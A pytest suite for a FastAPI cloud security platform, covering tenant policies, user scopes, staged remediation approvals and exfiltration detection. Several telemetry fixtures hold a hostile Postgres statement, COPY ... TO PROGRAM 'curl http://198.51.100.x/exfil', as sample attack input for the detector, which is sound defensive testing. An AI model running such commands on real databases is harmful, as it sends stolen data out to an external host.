import os
import secrets

from fastapi.testclient import TestClient

os.environ["PLATFORM_ADMIN_API_TOKEN"] = "test-admin-token"
os.environ["PLATFORM_BOOTSTRAP_ADMIN_USERNAME"] = "admin"
os.environ["PLATFORM_BOOTSTRAP_ADMIN_PASSWORD"] = "change-me-now"

from cloud_platform.main import app


client = TestClient(app)
ADMIN_HEADERS = {"x-admin-token": "test-admin-token"}


def admin_session_headers() -> dict[str, str]:
    response = client.post(
        "/auth/login",
        json={"username": "admin", "password": "change-me-now"},
    )
    assert response.status_code == 200
    token = response.json()["token"]
    return {"Authorization": f"Bearer {token}"}


def test_health() -> None:
    response = client.get("/health")
    assert response.status_code == 200
    assert response.json() == {"status": "ok"}


def test_tenant_policy_crud() -> None:
    session_headers = admin_session_headers()
    create_response = client.put(
        "/platform/tenant-policies/tenant-api",
        headers=session_headers,
        json={
            "tenant_id": "tenant-api",
            "allowed_actions": ["snapshot_forensics", "block_egress"],
            "namespace_allowlist": ["payments"],
            "service_account_allowlist": ["payments-api"],
            "workload_label_allowlist": ["app=payments-api"],
            "selector_expressions": ["environment=prod", "service_account=payments-api"],
            "selector_mode": "all",
            "require_approval_for": ["block_egress"],
            "auto_execute_confidence_threshold": 0.97,
            "max_auto_severity": "medium",
            "kubernetes_namespace_prefix": "tenant-a"
        },
    )
    assert create_response.status_code == 200

    list_response = client.get("/platform/tenant-policies", headers=session_headers)
    assert list_response.status_code == 200
    assert any(item["tenant_id"] == "tenant-api" for item in list_response.json())

    get_response = client.get("/platform/tenant-policies/tenant-api", headers=session_headers)
    assert get_response.status_code == 200
    assert get_response.json()["allowed_actions"] == ["snapshot_forensics", "block_egress"]
    assert get_response.json()["selector_expressions"] == ["environment=prod", "service_account=payments-api"]

    audit_response = client.get("/platform/audit-log", headers=session_headers)
    assert audit_response.status_code == 200
    assert any(item["resource_id"] == "tenant-api" and item["actor"] == "admin" for item in audit_response.json())

    delete_response = client.delete("/platform/tenant-policies/tenant-api", headers=session_headers)
    assert delete_response.status_code == 200
    assert delete_response.json() == {"status": "deleted"}


def test_exception_and_approval_workflow_for_selector_blocked_remediation() -> None:
    admin_headers = admin_session_headers()
    tenant_id = f"tenant-exception-{secrets.token_hex(3)}"
    policy_response = client.put(
        f"/platform/tenant-policies/{tenant_id}",
        headers=admin_headers,
        json={
            "tenant_id": tenant_id,
            "allowed_actions": ["snapshot_forensics", "block_egress"],
            "namespace_allowlist": ["payments"],
            "environment_allowlist": ["prod"],
            "workload_allowlist": ["prod/payments/api*"],
            "service_account_allowlist": ["payments-api"],
            "workload_label_allowlist": ["app=payments-api"],
            "selector_expressions": ["label.team=security"],
            "selector_mode": "all",
            "required_approval_count": 2,
            "require_approval_for": ["block_egress"],
            "auto_execute_confidence_threshold": 0.95,
            "max_auto_severity": "medium",
            "kubernetes_namespace_prefix": None,
        },
    )
    assert policy_response.status_code == 200

    ingest_response = client.post(
        "/telemetry/ingest",
        json={
            "tenant_id": tenant_id,
            "source": "exception-test",
            "events": [
                {
                    "event_id": f"ex-db-{secrets.token_hex(2)}",
                    "kind": "database_query",
                    "timestamp": "2026-03-15T13:00:00Z",
                    "actor": {"user": "svc-api", "ip": "10.2.0.9"},
                    "workload": {
                        "cluster": "prod",
                        "namespace": "payments",
                        "pod": "api-9d1",
                        "container": "web",
                        "service_account": "payments-api",
                        "labels": {"app": "payments-api", "team": "platform"},
                    },
                    "database": {
                        "engine": "postgres",
                        "name": "payments",
                        "session_id": f"pg-ex-{secrets.token_hex(2)}",
                        "statement": "COPY payments TO PROGRAM 'curl http://198.51.100.25/out'",
                        "rows_returned": 9100,
                    },
                    "attributes": {"bytes_sent": 2100000},
                }
            ],
        },
    )
    assert ingest_response.status_code == 200
    detection_id = next(
        item["detection_id"]
        for item in ingest_response.json()["detections"]
        if item["tenant_id"] == tenant_id and item["severity"] == "critical"
    )

    blocked_plan = client.get(f"/detections/{detection_id}/remediation")
    assert blocked_plan.status_code == 200
    assert blocked_plan.json()["actions"] == []
    assert any("selector_policy" in item for item in blocked_plan.json()["blocked_actions"])

    exception_response = client.post(
        "/platform/remediation-exceptions",
        headers=admin_headers,
        json={
            "tenant_id": tenant_id,
            "detection_id": detection_id,
            "selector_expressions": [],
            "selector_mode": "all",
            "reason": "Temporary incident override",
            "expires_at": "2026-03-16T13:00:00Z",
        },
    )
    assert exception_response.status_code == 200
    exception_id = exception_response.json()["exception_id"]

    exceptions_list = client.get("/platform/remediation-exceptions", headers=admin_headers)
    assert exceptions_list.status_code == 200
    assert any(item["exception_id"] == exception_id for item in exceptions_list.json())

    allowed_plan = client.get(f"/detections/{detection_id}/remediation")
    assert allowed_plan.status_code == 200
    assert allowed_plan.json()["actions"]

    approval_response = client.post(
        f"/detections/{detection_id}/approve",
        headers=admin_headers,
        json={"reason": "Incident commander approved containment", "expires_at": "2026-03-16T13:30:00Z"},
    )
    assert approval_response.status_code == 200
    first_approval_id = approval_response.json()["approval_id"]

    approvals_list = client.get("/platform/remediation-approvals", headers=admin_headers)
    assert approvals_list.status_code == 200
    assert any(item["approval_id"] == first_approval_id for item in approvals_list.json())

    blocked_execute = client.post(
        "/detections/execute",
        headers=admin_headers,
        json={"detection_id": detection_id, "approval_id": first_approval_id, "dry_run": True},
    )
    assert blocked_execute.status_code == 200
    assert blocked_execute.json()["status"] == "blocked"

    second_approver_username = f"approver-{secrets.token_hex(4)}"
    second_user = client.post(
        "/platform/users",
        headers=admin_headers,
        json={
            "username": second_approver_username,
            "password": "approve-pass-2",
            "role": "remediation_approver",
            "tenant_scopes": [tenant_id],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
            "approver_groups": ["security"],
        },
    )
    assert second_user.status_code == 200
    second_login = client.post(
        "/auth/login",
        json={"username": second_approver_username, "password": "approve-pass-2"},
    )
    assert second_login.status_code == 200
    second_headers = {"Authorization": f"Bearer {second_login.json()['token']}"}

    second_approval_response = client.post(
        f"/detections/{detection_id}/approve",
        headers=second_headers,
        json={"reason": "Second approver confirmed", "expires_at": "2026-03-16T13:45:00Z"},
    )
    assert second_approval_response.status_code == 200
    second_approval_id = second_approval_response.json()["approval_id"]

    execute_response = client.post(
        "/detections/execute",
        headers=admin_headers,
        json={"detection_id": detection_id, "approval_id": second_approval_id, "dry_run": True},
    )
    assert execute_response.status_code == 200
    assert execute_response.json()["status"] == "executed"

    revoke_response = client.post(
        f"/platform/remediation-approvals/{first_approval_id}/revoke",
        headers=admin_headers,
        json={"reason": "Approval withdrawn after reassessment"},
    )
    assert revoke_response.status_code == 200
    assert revoke_response.json()["revoked_by"] == "admin"

    execute_after_revoke = client.post(
        "/detections/execute",
        headers=admin_headers,
        json={"detection_id": detection_id, "approval_id": second_approval_id, "dry_run": True},
    )
    assert execute_after_revoke.status_code == 200
    assert execute_after_revoke.json()["status"] == "blocked"

    delete_exception = client.delete(f"/platform/remediation-exceptions/{exception_id}", headers=admin_headers)
    assert delete_exception.status_code == 200


def test_staged_approval_policy_requires_ordered_role_signoff() -> None:
    admin_headers = admin_session_headers()
    tenant_id = f"tenant-stage-{secrets.token_hex(3)}"
    policy_response = client.put(
        f"/platform/tenant-policies/{tenant_id}",
        headers=admin_headers,
        json={
            "tenant_id": tenant_id,
            "allowed_actions": ["snapshot_forensics", "block_egress"],
            "namespace_allowlist": ["payments"],
            "environment_allowlist": ["prod"],
            "workload_allowlist": ["prod/payments/api*"],
            "service_account_allowlist": ["payments-api"],
            "workload_label_allowlist": ["app=payments-api"],
            "approval_stages": [
                {
                    "stage_name": "ops_review",
                    "required_roles": ["remediation_approver"],
                    "required_approver_groups": ["security"],
                    "required_count": 1,
                    "applies_to_actions": ["block_egress"],
                },
                {
                    "stage_name": "executive_signoff",
                    "required_roles": ["platform_admin"],
                    "required_approver_groups": ["platform"],
                    "required_count": 1,
                    "applies_to_actions": ["block_egress"],
                },
            ],
            "require_approval_for": ["block_egress"],
            "required_approval_count": 1,
            "auto_execute_confidence_threshold": 0.95,
            "max_auto_severity": "medium",
            "kubernetes_namespace_prefix": None,
        },
    )
    assert policy_response.status_code == 200

    ingest_response = client.post(
        "/telemetry/ingest",
        json={
            "tenant_id": tenant_id,
            "source": "stage-test",
            "events": [
                {
                    "event_id": f"stage-db-{secrets.token_hex(2)}",
                    "kind": "database_query",
                    "timestamp": "2026-03-15T14:00:00Z",
                    "actor": {"user": "svc-api", "ip": "10.2.1.9"},
                    "workload": {
                        "cluster": "prod",
                        "namespace": "payments",
                        "pod": "api-1ab",
                        "container": "web",
                        "service_account": "payments-api",
                        "labels": {"app": "payments-api"},
                    },
                    "database": {
                        "engine": "postgres",
                        "name": "payments",
                        "session_id": f"pg-stage-{secrets.token_hex(2)}",
                        "statement": "COPY payments TO PROGRAM 'curl http://198.51.100.50/out'",
                        "rows_returned": 9200,
                    },
                    "attributes": {"bytes_sent": 2200000},
                }
            ],
        },
    )
    assert ingest_response.status_code == 200
    detection_id = next(
        item["detection_id"]
        for item in ingest_response.json()["detections"]
        if item["tenant_id"] == tenant_id and item["severity"] == "critical"
    )

    approver_username = f"ops-approver-{secrets.token_hex(4)}"
    create_user = client.post(
        "/platform/users",
        headers=admin_headers,
        json={
            "username": approver_username,
            "password": "ops-pass",
            "role": "remediation_approver",
            "tenant_scopes": [tenant_id],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
            "approver_groups": ["tenant_owner"],
        },
    )
    assert create_user.status_code == 200
    approver_login = client.post("/auth/login", json={"username": approver_username, "password": "ops-pass"})
    assert approver_login.status_code == 200
    approver_headers = {"Authorization": f"Bearer {approver_login.json()['token']}"}

    wrong_stage_first = client.post(
        f"/detections/{detection_id}/approve",
        headers=approver_headers,
        json={
            "stage_name": "ops_review",
            "reason": "User lacks security approver group",
            "expires_at": "2026-03-16T14:00:00Z",
        },
    )
    assert wrong_stage_first.status_code == 403

    wrong_order = client.post(
        f"/detections/{detection_id}/approve",
        headers=admin_headers,
        json={
            "stage_name": "executive_signoff",
            "reason": "Trying to skip ops review",
            "expires_at": "2026-03-16T14:00:00Z",
        },
    )
    assert wrong_order.status_code == 403

    scope_fix = client.patch(
        f"/platform/users/{approver_username}/scopes",
        headers=admin_headers,
        json={
            "tenant_scopes": [tenant_id],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
            "approver_groups": ["security"],
        },
    )
    assert scope_fix.status_code == 200

    refreshed_login = client.post("/auth/login", json={"username": approver_username, "password": "ops-pass"})
    assert refreshed_login.status_code == 200
    approver_headers = {"Authorization": f"Bearer {refreshed_login.json()['token']}"}

    ops_approval = client.post(
        f"/detections/{detection_id}/approve",
        headers=approver_headers,
        json={
            "stage_name": "ops_review",
            "reason": "Ops approved containment",
            "expires_at": "2026-03-16T14:00:00Z",
        },
    )
    assert ops_approval.status_code == 200
    assert ops_approval.json()["stage_name"] == "ops_review"

    blocked_execute = client.post(
        "/detections/execute",
        headers=admin_headers,
        json={"detection_id": detection_id, "approval_id": ops_approval.json()["approval_id"], "dry_run": True},
    )
    assert blocked_execute.status_code == 200
    assert blocked_execute.json()["status"] == "blocked"

    executive_approval = client.post(
        f"/detections/{detection_id}/approve",
        headers=admin_headers,
        json={
            "stage_name": "executive_signoff",
            "reason": "Platform admin approved execution",
            "expires_at": "2026-03-16T14:10:00Z",
        },
    )
    assert executive_approval.status_code == 200
    assert executive_approval.json()["stage_name"] == "executive_signoff"

    allowed_execute = client.post(
        "/detections/execute",
        headers=admin_headers,
        json={"detection_id": detection_id, "approval_id": executive_approval.json()["approval_id"], "dry_run": True},
    )
    assert allowed_execute.status_code == 200
    assert allowed_execute.json()["status"] == "executed"


def test_admin_can_create_and_list_users() -> None:
    session_headers = admin_session_headers()
    username = f"viewer-rbac-{secrets.token_hex(4)}"
    create_response = client.post(
        "/platform/users",
        headers=session_headers,
        json={"username": username, "password": "viewer-pass", "role": "viewer"},
    )
    assert create_response.status_code == 200
    assert create_response.json()["username"] == username
    assert create_response.json()["role"] == "viewer"

    list_response = client.get("/platform/users", headers=session_headers)
    assert list_response.status_code == 200
    assert any(item["username"] == username for item in list_response.json())

    role_response = client.patch(
        f"/platform/users/{username}/role",
        headers=session_headers,
        json={"role": "platform_admin"},
    )
    assert role_response.status_code == 200
    assert role_response.json()["role"] == "platform_admin"

    rotate_response = client.post(
        f"/platform/users/{username}/rotate-password",
        headers=session_headers,
        json={"new_password": "viewer-pass-2"},
    )
    assert rotate_response.status_code == 200

    scope_response = client.patch(
        f"/platform/users/{username}/scopes",
        headers=session_headers,
        json={
            "tenant_scopes": ["tenant-a", "tenant-b"],
            "namespace_scopes": ["payments", "checkout"],
            "environment_scopes": ["prod", "stage"],
            "workload_scopes": ["prod/payments/api*", "stage/checkout/web*"],
            "service_account_scopes": ["payments-api", "checkout-web"],
            "workload_label_scopes": ["app=payments-api", "tier=frontend"],
            "approver_groups": ["security", "tenant_owner"],
        },
    )
    assert scope_response.status_code == 200
    assert scope_response.json()["tenant_scopes"] == ["tenant-a", "tenant-b"]
    assert scope_response.json()["namespace_scopes"] == ["payments", "checkout"]
    assert scope_response.json()["environment_scopes"] == ["prod", "stage"]
    assert scope_response.json()["workload_scopes"] == ["prod/payments/api*", "stage/checkout/web*"]
    assert scope_response.json()["service_account_scopes"] == ["payments-api", "checkout-web"]
    assert scope_response.json()["workload_label_scopes"] == ["app=payments-api", "tier=frontend"]
    assert scope_response.json()["approver_groups"] == ["security", "tenant_owner"]

    login_response = client.post(
        "/auth/login",
        json={"username": username, "password": "viewer-pass-2"},
    )
    assert login_response.status_code == 200
    assert login_response.json()["role"] == "platform_admin"


def test_tenant_policy_requires_auth() -> None:
    response = client.get("/platform/tenant-policies")
    assert response.status_code in {401, 503}


def test_login_returns_session_token() -> None:
    response = client.post(
        "/auth/login",
        json={"username": "admin", "password": "change-me-now"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["username"] == "admin"
    assert body["role"] == "platform_admin"
    assert body["token"]
    assert body["expires_at"]
    assert "users:write" in body["permissions"]
    assert body["environment_scopes"] == []
    assert body["workload_scopes"] == []
    assert body["service_account_scopes"] == []
    assert body["workload_label_scopes"] == []
    assert body["approver_groups"] == ["platform", "security"]


def test_logout_revokes_session() -> None:
    login_response = client.post(
        "/auth/login",
        json={"username": "admin", "password": "change-me-now"},
    )
    token = login_response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}

    protected_before = client.get("/platform/tenant-policies", headers=headers)
    assert protected_before.status_code == 200

    logout_response = client.post("/auth/logout", headers=headers)
    assert logout_response.status_code == 200
    assert logout_response.json() == {"status": "logged_out"}

    protected_after = client.get("/platform/tenant-policies", headers=headers)
    assert protected_after.status_code == 401


def test_permission_scoping_blocks_non_authorized_actions() -> None:
    admin_headers = admin_session_headers()
    username = f"policy-user-{secrets.token_hex(4)}"

    tenant_one = f"tenant-scope-{secrets.token_hex(3)}"
    tenant_two = f"tenant-scope-{secrets.token_hex(3)}"
    create_policy = client.put(
        f"/platform/tenant-policies/{tenant_one}",
        headers=admin_headers,
        json={
            "tenant_id": tenant_one,
            "allowed_actions": ["snapshot_forensics"],
            "namespace_allowlist": ["payments"],
            "environment_allowlist": ["prod"],
            "workload_allowlist": ["prod/payments/api*"],
            "service_account_allowlist": ["payments-api"],
            "workload_label_allowlist": ["app=payments-api"],
            "require_approval_for": ["snapshot_forensics"],
            "auto_execute_confidence_threshold": 0.9,
            "max_auto_severity": "medium",
            "kubernetes_namespace_prefix": None,
        },
    )
    assert create_policy.status_code == 200
    create_policy = client.put(
        f"/platform/tenant-policies/{tenant_two}",
        headers=admin_headers,
        json={
            "tenant_id": tenant_two,
            "allowed_actions": ["snapshot_forensics"],
            "namespace_allowlist": ["restricted"],
            "environment_allowlist": ["stage"],
            "workload_allowlist": ["stage/restricted/jobs*"],
            "service_account_allowlist": ["restricted-jobs"],
            "workload_label_allowlist": ["team=security"],
            "require_approval_for": ["snapshot_forensics"],
            "auto_execute_confidence_threshold": 0.9,
            "max_auto_severity": "medium",
            "kubernetes_namespace_prefix": None,
        },
    )
    assert create_policy.status_code == 200

    create_response = client.post(
        "/platform/users",
        headers=admin_headers,
        json={
            "username": username,
            "password": "policy-pass",
            "role": "policy_admin",
            "tenant_scopes": [tenant_one],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
        },
    )
    assert create_response.status_code == 200

    login_response = client.post(
        "/auth/login",
        json={"username": username, "password": "policy-pass"},
    )
    assert login_response.status_code == 200
    policy_headers = {"Authorization": f"Bearer {login_response.json()['token']}"}

    policy_list = client.get("/platform/tenant-policies", headers=policy_headers)
    assert policy_list.status_code == 200
    tenant_ids = {item["tenant_id"] for item in policy_list.json()}
    assert tenant_one in tenant_ids
    assert tenant_two not in tenant_ids

    allowed_policy = client.get(f"/platform/tenant-policies/{tenant_one}", headers=policy_headers)
    assert allowed_policy.status_code == 200

    blocked_policy = client.get(f"/platform/tenant-policies/{tenant_two}", headers=policy_headers)
    assert blocked_policy.status_code == 403

    users_list = client.get("/platform/users", headers=policy_headers)
    assert users_list.status_code == 403


def test_remediation_execution_enforces_environment_and_workload_scopes() -> None:
    ingest_response = client.post(
        "/telemetry/ingest",
        json={
            "tenant_id": "tenant-remediation-scope",
            "source": "scope-test",
            "events": [
                {
                    "event_id": "scope-db-1",
                    "kind": "database_query",
                    "timestamp": "2026-03-15T12:00:00Z",
                    "actor": {"user": "svc-api", "ip": "10.2.0.8"},
                    "workload": {
                        "cluster": "prod",
                        "namespace": "payments",
                        "pod": "api-7d9",
                        "container": "web",
                        "service_account": "payments-api",
                        "labels": {"app": "payments-api", "tier": "backend"},
                    },
                    "database": {
                        "engine": "postgres",
                        "name": "payments",
                        "session_id": "pg-scope-123",
                        "statement": "COPY users TO PROGRAM 'curl http://198.51.100.10/exfil'",
                        "rows_returned": 9000,
                    },
                    "network": {"destination_ip": "198.51.100.10", "destination_port": 443, "protocol": "TCP"},
                    "attributes": {"bytes_sent": 1900000},
                }
            ],
        },
    )
    assert ingest_response.status_code == 200
    detection_id = next(
        item["detection_id"]
        for item in ingest_response.json()["detections"]
        if item["severity"] == "critical"
        and item["tenant_id"] == "tenant-remediation-scope"
        and "scope-db-1" in item["evidence_event_ids"]
    )

    admin_headers = admin_session_headers()
    username = f"remediation-user-{secrets.token_hex(4)}"
    create_response = client.post(
        "/platform/users",
        headers=admin_headers,
        json={
            "username": username,
            "password": "approve-pass",
            "role": "remediation_approver",
            "tenant_scopes": ["tenant-remediation-scope"],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["stage"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
        },
    )
    assert create_response.status_code == 200

    login_response = client.post(
        "/auth/login",
        json={"username": username, "password": "approve-pass"},
    )
    assert login_response.status_code == 200
    blocked_headers = {"Authorization": f"Bearer {login_response.json()['token']}"}

    blocked_response = client.post(
        "/detections/execute",
        headers=blocked_headers,
        json={"detection_id": detection_id, "approved": True, "dry_run": True},
    )
    assert blocked_response.status_code == 403
    assert "Environment prod is outside the caller scope." in blocked_response.json()["detail"]

    scope_update = client.patch(
        f"/platform/users/{username}/scopes",
        headers=admin_headers,
        json={
            "tenant_scopes": ["tenant-remediation-scope"],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/worker*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
        },
    )
    assert scope_update.status_code == 200

    relogin_response = client.post(
        "/auth/login",
        json={"username": username, "password": "approve-pass"},
    )
    assert relogin_response.status_code == 200
    workload_headers = {"Authorization": f"Bearer {relogin_response.json()['token']}"}

    workload_blocked = client.post(
        "/detections/execute",
        headers=workload_headers,
        json={"detection_id": detection_id, "approved": True, "dry_run": True},
    )
    assert workload_blocked.status_code == 403
    assert "Workload prod/payments/api is outside the caller scope." in workload_blocked.json()["detail"]

    final_scope_update = client.patch(
        f"/platform/users/{username}/scopes",
        headers=admin_headers,
        json={
            "tenant_scopes": ["tenant-remediation-scope"],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-jobs"],
            "workload_label_scopes": ["app=payments-api"],
        },
    )
    assert final_scope_update.status_code == 200

    service_account_login = client.post(
        "/auth/login",
        json={"username": username, "password": "approve-pass"},
    )
    assert service_account_login.status_code == 200
    service_account_headers = {"Authorization": f"Bearer {service_account_login.json()['token']}"}

    service_account_blocked = client.post(
        "/detections/execute",
        headers=service_account_headers,
        json={"detection_id": detection_id, "approved": True, "dry_run": True},
    )
    assert service_account_blocked.status_code == 403
    assert "Service account payments-api is outside the caller scope." in service_account_blocked.json()["detail"]

    final_scope_update = client.patch(
        f"/platform/users/{username}/scopes",
        headers=admin_headers,
        json={
            "tenant_scopes": ["tenant-remediation-scope"],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["team=analytics"],
        },
    )
    assert final_scope_update.status_code == 200

    final_login = client.post(
        "/auth/login",
        json={"username": username, "password": "approve-pass"},
    )
    assert final_login.status_code == 200
    final_headers = {"Authorization": f"Bearer {final_login.json()['token']}"}

    label_blocked_response = client.post(
        "/detections/execute",
        headers=final_headers,
        json={"detection_id": detection_id, "approved": True, "dry_run": True},
    )
    assert label_blocked_response.status_code == 403
    assert "Workload labels are outside the caller scope." in label_blocked_response.json()["detail"]

    label_scope_update = client.patch(
        f"/platform/users/{username}/scopes",
        headers=admin_headers,
        json={
            "tenant_scopes": ["tenant-remediation-scope"],
            "namespace_scopes": ["payments"],
            "environment_scopes": ["prod"],
            "workload_scopes": ["prod/payments/api*"],
            "service_account_scopes": ["payments-api"],
            "workload_label_scopes": ["app=payments-api"],
        },
    )
    assert label_scope_update.status_code == 200

    allowed_login = client.post(
        "/auth/login",
        json={"username": username, "password": "approve-pass"},
    )
    assert allowed_login.status_code == 200
    allowed_headers = {"Authorization": f"Bearer {allowed_login.json()['token']}"}

    allowed_response = client.post(
        "/detections/execute",
        headers=allowed_headers,
        json={"detection_id": detection_id, "approved": True, "dry_run": True},
    )
    assert allowed_response.status_code == 200
    assert allowed_response.json()["status"] == "executed"


def test_ingest_generates_detections() -> None:
    payload = {
        "tenant_id": "tenant-a",
        "source": "integration-test",
        "events": [
            {
                "event_id": "db-1",
                "kind": "database_query",
                "timestamp": "2026-03-15T10:00:00Z",
                "actor": {"user": "svc-api", "ip": "10.0.0.8"},
                "workload": {"cluster": "prod", "namespace": "payments", "pod": "api-7d9", "container": "web"},
                "database": {
                    "engine": "postgres",
                    "name": "payments",
                    "session_id": "pg-123",
                    "statement": "COPY users TO PROGRAM 'curl http://198.51.100.10/exfil'",
                    "rows_returned": 7000
                },
                "network": {"destination_ip": "198.51.100.10", "destination_port": 443, "protocol": "TCP"},
                "attributes": {"bytes_sent": 1900000}
            },
            {
                "event_id": "k8s-1",
                "kind": "kubernetes_audit",
                "timestamp": "2026-03-15T10:00:05Z",
                "actor": {"user": "svc-api", "ip": "10.0.0.8"},
                "workload": {"cluster": "prod", "namespace": "payments", "pod": "api-7d9", "container": "web"},
                "kubernetes": {"verb": "create", "resource": "secrets", "name": "db-copy"},
                "attributes": {}
            }
        ]
    }

    response = client.post("/telemetry/ingest", json=payload)
    assert response.status_code == 200
    body = response.json()
    assert body["ingested_events"] == 2
    assert body["new_detections"] >= 2

    detections_response = client.get("/detections")
    assert detections_response.status_code == 200
    detections = detections_response.json()
    assert any(item["severity"] == "critical" for item in detections)

    critical = next(item for item in detections if item["severity"] == "critical")
    remediation_response = client.get(f"/detections/{critical['detection_id']}/remediation")
    assert remediation_response.status_code == 200
    remediation = remediation_response.json()
    assert remediation["approval_required"] is True
    assert any(action["action_type"] == "block_egress" for action in remediation["actions"])

    execute_blocked = client.post(
        "/detections/execute",
        headers=admin_session_headers(),
        json={"detection_id": critical["detection_id"], "approved": False},
    )
    assert execute_blocked.status_code == 200
    assert execute_blocked.json()["status"] == "blocked"

    execute_approved = client.post(
        "/detections/execute",
        headers=admin_session_headers(),
        json={"detection_id": critical["detection_id"], "approved": True, "dry_run": True},
    )
    assert execute_approved.status_code == 200
    assert execute_approved.json()["status"] == "executed"
    assert execute_approved.json()["action_results"]


def test_protocol_ingest_normalizes_database_frames() -> None:
    payload = {
        "tenant_id": "tenant-wire",
        "source": "pg-proxy",
        "frames": [
            {
                "frame_id": "frame-1",
                "protocol": "postgresql",
                "message_type": "startup",
                "timestamp": "2026-03-15T11:00:00Z",
                "actor": {"user": "svc-db", "ip": "10.0.0.20"},
                "workload": {
                    "cluster": "prod",
                    "namespace": "data",
                    "pod": "ingestor-1",
                    "container": "worker",
                    "service_account": "ledger-reader",
                    "labels": {"app": "ledger-ingestor"},
                },
                "database_name": "ledger",
                "session_id": "pg-wire-1",
                "destination_ip": "10.0.0.30",
                "destination_port": 5432
            },
            {
                "frame_id": "frame-2",
                "protocol": "postgresql",
                "message_type": "query",
                "timestamp": "2026-03-15T11:00:01Z",
                "actor": {"user": "svc-db", "ip": "10.0.0.20"},
                "workload": {
                    "cluster": "prod",
                    "namespace": "data",
                    "pod": "ingestor-1",
                    "container": "worker",
                    "service_account": "ledger-reader",
                    "labels": {"app": "ledger-ingestor"},
                },
                "database_name": "ledger",
                "session_id": "pg-wire-1",
                "statement": "COPY ledger TO PROGRAM 'curl http://198.51.100.99/out'",
                "rows_returned": 8000,
                "destination_ip": "10.0.0.30",
                "destination_port": 5432
            }
        ]
    }

    response = client.post("/telemetry/ingest/protocol", json=payload)
    assert response.status_code == 200
    body = response.json()
    assert body["ingested_events"] == 2
    assert body["new_detections"] >= 1
